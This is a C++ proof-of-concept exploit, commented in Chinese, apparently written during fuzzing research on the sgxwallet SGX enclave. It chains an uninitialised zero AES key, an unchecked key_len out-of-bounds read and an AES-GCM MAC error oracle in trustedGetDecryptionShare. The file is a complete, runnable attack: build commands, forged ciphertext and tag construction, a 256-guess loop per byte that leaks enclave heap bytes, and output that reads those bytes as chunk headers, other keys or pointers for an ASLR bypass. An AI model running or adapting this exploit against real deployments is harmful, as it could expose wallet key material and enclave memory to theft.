// PoC: sgxwallet trustedGetDecryptionShare — AES-GCM MAC Oracle 泄露飞地堆
//
// 组合漏洞:
//   1. AES_key[512] 未初始化 (全零) → 攻击者掌握完整加密能力
//   2. key_len 与 encryptedPrivateKey 缓冲区大小 (1024) 无交叉校验
//      → key_len > 1024 时 AES_decrypt 越界读堆数据作为密文
//   3. GCM MAC 验证结果通过 errStatus 返回 → 明确的 oracle
//
// 攻击原理:
//   key=0 时 H, keystream, E(K,J0) 全部已知。
//   设 key_len = 1025，GCM 将堆上第 1025 字节当密文读入 GHASH。
//   攻击者猜测该字节值 g，计算对应 tag:
//     tag_g = GHASH(H, known_ct || g) XOR E(K, J0)
//   若 g == 实际堆字节 → MAC 匹配 → errStatus=0
//   若 g != 实际堆字节 → MAC 不匹配 → errStatus=12289
//   逐字节推进，最多泄露 28 字节 (key_len 上限 1052)。
//
// 编译:
//   FUZZ_SDK=/home/leone/EnclaveFuzz/install/enclave_fuzz_v
//   g++ -std=c++17 -O2 -g \
//       -I${FUZZ_SDK}/include -I. \
//       poc_heap_oracle.cpp secure_enclave_u.o third_party/intel/oc_alloc.c \
//       -lsgx_urts -lssl -lcrypto \
//       -o poc_heap_oracle
//
// 运行:
//   ./poc_heap_oracle

#include <stdio.h>
#include <stdint.h>
#include <string.h>
#include <stdlib.h>
#include <openssl/evp.h>
#include <openssl/rand.h>
#include <sgx_urts.h>
#include "secure_enclave_u.h"

// ── 常量 ─────────────────────────────────────────────────────────────────────
#define MAC_SIZE   16
#define IV_SIZE    12
#define BUF_SIZE   1024
#define MAX_OOB    28    // 1052 - 1024, msgLen check 限制

#define TYPE_BLS        '2'
#define EXPORTABLE_FLAG '1'
#define ENCLAVE_FILE    "secure_enclave/secure_enclave.signed.so"

static const char ATTACKER_KEY_HEX[65] =
    "deadbeefcafebabe1234567890abcdef"
    "deadbeefcafebabe1234567890abcdef";

static const char G2_GENERATOR[] =
    "10857046999023057135944570762232829481370756359578518086990519993285655852781"
    ":11559732032986387107991004021392285783925812861821192530917403151452391805634"
    ":8495653923123431417604973247489272438418190587263600148770280649306958101930"
    ":4082367875863433681332203403145435568316851327593401208105741076214120093531";

// ── OCall 桩 ─────────────────────────────────────────────────────────────────
void ocall_SGXWalletServer_log(int level, const char *msg) {
    (void)level; (void)msg;
}

// ── 预计算 AES-CTR keystream (key=0) ─────────────────────────────────────────
// AES-GCM 内部用 CTR 模式: ciphertext = plaintext XOR keystream
// key=0, IV 已知 → keystream 完全确定
static void compute_keystream(const uint8_t *key16, const uint8_t *iv,
                              uint8_t *keystream, int len) {
    uint8_t zeros[1024] = {0};
    EVP_CIPHER_CTX *ctx = EVP_CIPHER_CTX_new();
    int outl = 0;
    EVP_EncryptInit_ex(ctx, EVP_aes_128_gcm(), NULL, NULL, NULL);
    EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_GCM_SET_IVLEN, IV_SIZE, NULL);
    EVP_EncryptInit_ex(ctx, NULL, NULL, key16, iv);
    EVP_EncryptUpdate(ctx, keystream, &outl, zeros, len);
    EVP_CIPHER_CTX_free(ctx);
}

// ── 为指定密文计算 GCM tag ───────────────────────────────────────────────────
// 原理: 构造 plaintext 使 encrypt 输出恰好是 desired_ciphertext
//   plaintext = desired_ciphertext XOR keystream
//   encrypt(plaintext) → ciphertext == desired_ciphertext, tag = 正确值
static void compute_tag_for_ct(const uint8_t *key16, const uint8_t *iv,
                               const uint8_t *keystream,
                               const uint8_t *desired_ct, int ct_len,
                               uint8_t *out_tag) {
    uint8_t pt[1024];
    for (int i = 0; i < ct_len; i++)
        pt[i] = desired_ct[i] ^ keystream[i];

    EVP_CIPHER_CTX *ctx = EVP_CIPHER_CTX_new();
    uint8_t tmp[1024];
    int outl = 0;
    EVP_EncryptInit_ex(ctx, EVP_aes_128_gcm(), NULL, NULL, NULL);
    EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_GCM_SET_IVLEN, IV_SIZE, NULL);
    EVP_EncryptInit_ex(ctx, NULL, NULL, key16, iv);
    EVP_EncryptUpdate(ctx, tmp, &outl, pt, ct_len);
    EVP_EncryptFinal_ex(ctx, tmp + outl, &outl);
    EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_GCM_GET_TAG, MAC_SIZE, out_tag);
    EVP_CIPHER_CTX_free(ctx);
}

// ── main ─────────────────────────────────────────────────────────────────────
int main(int argc, char **argv) {
    int warmup_rounds = 0;
    if (argc > 1) warmup_rounds = atoi(argv[1]);
    printf("=== PoC: AES-GCM MAC Oracle — 逐字节泄露飞地堆数据 ===\n");
    printf("    堆预热轮数: %d (用法: %s [轮数])\n\n", warmup_rounds, argv[0]);

    // ── 加载飞地 ─────────────────────────────────────────────────────────────
    sgx_enclave_id_t eid = 0;
    sgx_launch_token_t token = {};
    int updated = 0;
    sgx_status_t st = sgx_create_enclave(
        ENCLAVE_FILE, SGX_DEBUG_FLAG, &token, &updated, &eid, NULL);
    if (st != SGX_SUCCESS) {
        fprintf(stderr, "[-] sgx_create_enclave failed: 0x%x\n", st);
        return 1;
    }
    printf("[+] 飞地加载成功\n");

    // ── trustedEnclaveInit (不初始化 SEK) ────────────────────────────────────
    st = trustedEnclaveInit(eid, 0);
    if (st != SGX_SUCCESS) {
        fprintf(stderr, "[-] trustedEnclaveInit failed: 0x%x\n", st);
        return 1;
    }
    printf("[+] trustedEnclaveInit 成功, AES_key = 0\n");

    // ── 堆预热: 调用 trustedGenerateBLSKey 搅乱堆布局 ───────────────────────
    if (warmup_rounds > 0) {
        printf("\n[*] 堆预热: 调用 trustedGenerateBLSKey %d 次...\n", warmup_rounds);
        for (int r = 0; r < warmup_rounds; r++) {
            int      bls_err = -1;
            char     bls_errStr[1024] = {0};
            int      bls_exportable = 0;
            uint8_t  bls_encKey[1024] = {0};
            uint64_t bls_encLen = 0;
            st = trustedGenerateBLSKey(eid, &bls_err, bls_errStr,
                                       &bls_exportable, bls_encKey, &bls_encLen);
            printf("    轮 %d: sgx=0x%x err=%d encLen=%lu\n",
                   r+1, st, bls_err, (unsigned long)bls_encLen);
        }
        printf("[+] 堆预热完成, freelist 已包含 BLS 密钥残留\n");
    }

    // ── 验证 zero-SEK 基线 (key_len=95, 无 OOB) ─────────────────────────────
    printf("\n[*] 基线验证: zero-SEK 无 OOB ...\n");
    {
        uint8_t zero_key[16] = {0};
        uint8_t pt[67];
        pt[0] = TYPE_BLS;
        pt[1] = EXPORTABLE_FLAG;
        memcpy(pt + 2, ATTACKER_KEY_HEX, 64);
        pt[66] = '\0';

        uint8_t blob[MAC_SIZE + IV_SIZE + 67];
        uint8_t *mac = blob;
        uint8_t *iv  = blob + MAC_SIZE;
        uint8_t *ct  = blob + MAC_SIZE + IV_SIZE;
        RAND_bytes(iv, IV_SIZE);

        EVP_CIPHER_CTX *ctx = EVP_CIPHER_CTX_new();
        int outl = 0;
        EVP_EncryptInit_ex(ctx, EVP_aes_128_gcm(), NULL, NULL, NULL);
        EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_GCM_SET_IVLEN, IV_SIZE, NULL);
        EVP_EncryptInit_ex(ctx, NULL, NULL, zero_key, iv);
        EVP_EncryptUpdate(ctx, ct, &outl, pt, 67);
        EVP_EncryptFinal_ex(ctx, ct + outl, &outl);
        EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_GCM_GET_TAG, MAC_SIZE, mac);
        EVP_CIPHER_CTX_free(ctx);

        int errStatus = -1;
        char errStr[1024] = {0}, share[1024] = {0};
        st = trustedGetDecryptionShare(
            eid, &errStatus, errStr, blob, G2_GENERATOR, 95, share);
        if (st == SGX_SUCCESS && errStatus == 0) {
            printf("[+] 基线通过: zero-SEK 有效\n");
        } else {
            fprintf(stderr, "[-] 基线失败: st=0x%x err=%d %s\n",
                    st, errStatus, errStr);
            return 1;
        }
    }

    // ── 准备 oracle 参数 ─────────────────────────────────────────────────────
    uint8_t zero_key[16] = {0};
    uint8_t iv[IV_SIZE];
    RAND_bytes(iv, IV_SIZE);  // oracle 全程使用同一 IV

    // 预计算 keystream (最大长度 1024 = max ciphertext)
    uint8_t keystream[1024];
    compute_keystream(zero_key, iv, keystream, 1024);

    // BLS 明文 (67 字节有效 + 后续填零)
    uint8_t bls_pt[1024] = {0};
    bls_pt[0] = TYPE_BLS;
    bls_pt[1] = EXPORTABLE_FLAG;
    memcpy(bls_pt + 2, ATTACKER_KEY_HEX, 64);
    bls_pt[66] = '\0';

    // 基础密文 (放入 forge_blob[28..1023] 的 996 字节)
    uint8_t base_ct[996];
    for (int i = 0; i < 996; i++)
        base_ct[i] = bls_pt[i] ^ keystream[i];

    // ── Oracle 主循环 ────────────────────────────────────────────────────────
    printf("\n[*] 开始 oracle 攻击: 逐字节泄露 encryptedPrivateKey 缓冲区后 %d 字节\n",
           MAX_OOB);
    printf("    每字节最多 256 次 ECALL, 总计最多 %d 次\n\n", 256 * MAX_OOB);

    uint8_t leaked[MAX_OOB] = {0};
    int leaked_count = 0;
    int total_calls = 0;

    for (int pos = 0; pos < MAX_OOB; pos++) {
        int ct_len = 997 + pos;                  // 密文总长
        uint64_t key_len = ct_len + MAC_SIZE + IV_SIZE;  // = 1025 + pos

        // 构造 desired_ct 模板 (除最后 1 字节外固定)
        uint8_t desired_ct[1024];
        memcpy(desired_ct, base_ct, 996);         // 已知密文
        memcpy(desired_ct + 996, leaked, pos);    // 之前猜出的堆字节

        int found = 0;
        for (int guess = 0; guess < 256; guess++) {
            desired_ct[996 + pos] = (uint8_t)guess;

            // 计算此密文对应的 GCM tag
            uint8_t tag[MAC_SIZE];
            compute_tag_for_ct(zero_key, iv, keystream,
                               desired_ct, ct_len, tag);

            // 组装 forge_blob (只有 tag 随 guess 变化)
            uint8_t forge_blob[BUF_SIZE];
            memcpy(forge_blob, tag, MAC_SIZE);             // [0..15]  MAC
            memcpy(forge_blob + MAC_SIZE, iv, IV_SIZE);    // [16..27] IV
            memcpy(forge_blob + MAC_SIZE + IV_SIZE,        // [28..1023] CT
                   base_ct, 996);

            int errStatus = -1;
            char errStr[1024] = {0}, share[1024] = {0};
            st = trustedGetDecryptionShare(
                eid, &errStatus, errStr,
                forge_blob, G2_GENERATOR, key_len, share);
            total_calls++;

            if (st == SGX_SUCCESS && errStatus == 0) {
                leaked[pos] = (uint8_t)guess;
                leaked_count++;
                printf("  [+] offset +%d: 0x%02x '%c'  (%d guesses)\n",
                       pos, guess,
                       (guess >= 0x20 && guess < 0x7f) ? guess : '.',
                       guess + 1);
                found = 1;
                break;
            }
        }

        if (!found) {
            printf("  [-] offset +%d: 未找到匹配 (堆数据可能在猜测间变化)\n", pos);
            // 继续尝试下一个字节（跳过不稳定的字节）
            leaked[pos] = 0xFF;  // 标记为未知
        }
    }

    // ── 输出结果 ─────────────────────────────────────────────────────────────
    printf("\n=== 结果 ===\n");
    printf("总 ECALL 次数: %d\n", total_calls);
    printf("成功泄露: %d / %d 字节\n", leaked_count, MAX_OOB);
    printf("\n泄露数据 (encryptedPrivateKey 缓冲区 +1024 偏移处):\n");
    printf("  偏移  十六进制  ASCII\n");
    printf("  ────  ────────  ─────\n");
    for (int i = 0; i < MAX_OOB; i++) {
        if (leaked[i] != 0xFF || i < leaked_count) {
            printf("  +%04d  0x%02x      %c\n",
                   1024 + i, leaked[i],
                   (leaked[i] >= 0x20 && leaked[i] < 0x7f) ? leaked[i] : '.');
        } else {
            printf("  +%04d  ??        (不稳定)\n", 1024 + i);
        }
    }

    printf("\n解读:\n");
    printf("  这些字节位于飞地堆 malloc(1024) 分配之后，可能是:\n");
    printf("  - dlmalloc chunk header (size/flags 字段)\n");
    printf("  - 相邻分配的数据 (其他密钥、内部状态)\n");
    printf("  - 已释放 chunk 的 fd/bk 指针 → 堆地址泄露 (ASLR bypass)\n");

    sgx_destroy_enclave(eid);
    return 0;
}
